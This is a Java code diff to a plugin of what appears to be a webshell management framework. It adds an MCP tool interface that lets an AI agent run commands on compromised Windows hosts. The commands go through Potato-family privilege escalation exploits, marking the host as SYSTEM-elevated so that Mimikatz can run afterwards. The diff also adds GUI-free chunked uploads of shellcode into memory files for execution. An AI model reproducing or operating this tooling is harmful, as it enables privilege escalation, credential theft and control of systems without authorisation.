@@ -12,6 +12,8 @@ import com.kichik.pecoff4j.PE;
 import com.kichik.pecoff4j.io.PEParser;
 import core.EasyI18N;
 import core.Encoding;
+import core.annotation.McpParam;
+import core.annotation.McpTool;
 import core.imp.Payload;
 import core.imp.Plugin;
 import core.shell.ShellEntity;
@@ -28,6 +30,7 @@ import java.util.Collections;
 import java.util.HashSet;
 import java.util.List;
 import java.util.Set;
+import java.util.Map;
 import java.io.ByteArrayInputStream;
 import java.io.File;
 import java.io.FileInputStream;
@@ -55,6 +58,7 @@ import org.fife.ui.rtextarea.RTextScrollPane;
 import shells.plugins.PluginInfo;
 import shells.plugins.generic.model.DotNetGenerateInfo;
 import util.UiFunction;
+import util.Log;
 import util.automaticBindClick;
 import util.functions;
 import util.http.ReqParameter;
@@ -212,6 +216,30 @@ public abstract class TH_TOOLS implements Plugin {
         $$$setupUI$$$();
     }
 
+
+    @McpTool(name = "exec", desc = "通过 TH_TOOLS 提权框架执行命令。提权成功后自动标记全局提权, 后续 Mimikatz 等工具将以 SYSTEM 上下文执行; 服务重启后标记失效需重新提权。插件: EfsPotato/BadPotato/GodPotato/SweetPotato/PrintNotifyPotato/McpManagementPotato", params = {
+            @McpParam(name = "shellId", required = true, desc = "Shell ID"),
+            @McpParam(name = "command", required = true, desc = "要执行的命令 (建议 cmd /c 前缀, 如: cmd /c whoami)"),
+            @McpParam(name = "plugin", defaultValue = "EfsPotato", desc = "提权插件: EfsPotato/BadPotato/GodPotato/SweetPotato/PrintNotifyPotato/McpManagementPotato/不使用插件(直接注入)。不同系统成功率不同, 建议多试几个") })
+    public String mcpExec(Map<String, Object> args) {
+        String plugin = String.valueOf(args.getOrDefault("plugin", "EfsPotato"));
+        String cmd = String.valueOf(args.get("command"));
+        if (cmd == null || cmd.trim().isEmpty()) return "缺少参数: command";
+        try {
+            this.CurrentPlugin = plugin;
+            if (!this.loadPlugin(this.CurrentPlugin)) return "插件加载失败: " + plugin;
+            this.Excute_cmd = cmd;
+            byte[] result = this.ExeCuteCmd();
+            String resultString = this.encoding.Decoding(result);
+            if (this.isElevateSuccess(resultString)) {
+                this.markGlobalElevateEnabled();
+                System.out.println("[TH_TOOLS] MCP 提权成功, 已标记全局提权");
+            }
+            return resultString;
+        } catch (Exception e) {
+            return "执行失败: " + (e.getMessage() != null ? e.getMessage() : e.toString());
+        }
+    }
 
     public void init_plug() {
         this.excuteFileComboBox.addItem("C:\\Windows\\explorer.exe");
@@ -636,7 +664,12 @@ public abstract class TH_TOOLS implements Plugin {
 
         if (shellcode.length > this.shellEntity.getOnceBigFileUploadByteNum()) {
             String memFile = String.format("mem://%s", UUID.randomUUID().toString());
-            boolean uploadFlag = this.shellEntity.getFrame().getShellFileManager().uploadBigFile(memFile, "buf", new ByteArrayInputStream(shellcode));
+            boolean uploadFlag;
+            if (this.shellEntity.getFrame() != null) {
+                uploadFlag = this.shellEntity.getFrame().getShellFileManager().uploadBigFile(memFile, "buf", new ByteArrayInputStream(shellcode));
+            } else {
+                uploadFlag = mcpUploadBigFile(memFile, shellcode);
+            }
             if (!uploadFlag) {
                 this.payload.deleteFile(memFile);
                 return "Shellcode \u4e0a\u4f20\u5931\u8d25".getBytes();
@@ -650,6 +683,25 @@ public abstract class TH_TOOLS implements Plugin {
         reqParameter.add("readWaitTime", Integer.toString(readWait));
         byte[] result = this.payload.evalFunc(this.getClassName(), "run", reqParameter);
         return result;
+    }
+
+    /** MCP 兼容: 绕过 GUI ShellFileManager, 用 payload.bigFileUpload 分片上传到内存文件 */
+    private boolean mcpUploadBigFile(String memFile, byte[] data) {
+        try {
+            int once = this.shellEntity.getOnceBigFileUploadByteNum();
+            for (int off = 0; off < data.length; off += once) {
+                byte[] chunk = java.util.Arrays.copyOfRange(data, off, Math.min(off + once, data.length));
+                String flag = this.payload.bigFileUpload(memFile, (long)off, chunk);
+                if (!"ok".equals(flag)) {
+                    Log.log("mcpUploadBigFile: fail at " + off + " flag=" + flag);
+                    return false;
+                }
+            }
+            return true;
+        } catch (Exception e) {
+            Log.error(e);
+            return false;
+        }
     }
 
     private boolean isElevateSuccess(String resultString) {
@@ -690,7 +742,7 @@ public abstract class TH_TOOLS implements Plugin {
 
         if (shellEntity != null && isGlobalElevateEnabled(shellEntity)) {
             try {
-                Object plugin = shellEntity.getFrame().getPlugin("TH_TOOLS");
+                Object plugin = shellEntity.getFrame() != null ? shellEntity.getFrame().getPlugin("TH_TOOLS") : null;
                 if (plugin instanceof TH_TOOLS) {
                     TH_TOOLS thTools = (TH_TOOLS)plugin;
                     String executeFile = shellEntity.getEnv(ENV_TH_TOOLS_EXECUTE_FILE, (String)null);
@@ -700,11 +752,33 @@ public abstract class TH_TOOLS implements Plugin {
 
                     return thTools.runNetPe(args, pe, readWait, printWriter);
                 }
+                if (plugin == null && shellEntity.getFrame() == null) {
+                    // MCP 无 frame 会话: 自建 TH_TOOLS 实例走提权执行链
+                    TH_TOOLS thTools = createThToolsInstance(shellEntity);
+                    if (thTools != null) {
+                        return thTools.runNetPe(args, pe, readWait, printWriter);
+                    }
+                }
             } catch (Throwable var7) {
             }
         }
 
         return loader.runPe2(args, pe, readWait);
+    }
+
+    /** MCP 兼容: 按 shell payload 类型自建 TH_TOOLS 实例 (绕过 GUI frame 依赖) */
+    private static TH_TOOLS createThToolsInstance(ShellEntity shellEntity) {
+        try {
+            String cn = shellEntity.getPayloadModule().getClass().getName();
+            String lang = cn.contains("csharp") || cn.contains("netcore") ? "csharp" : "java";
+            Class<?> c = Class.forName("shells.plugins." + lang + ".TH_TOOLS");
+            TH_TOOLS t = (TH_TOOLS) c.newInstance();
+            t.init(shellEntity);
+            return t;
+        } catch (Throwable t) {
+            Log.error(t);
+            return null;
+        }
     }
 
     public PluginInfo SearchPluginByName(String PluginName) {
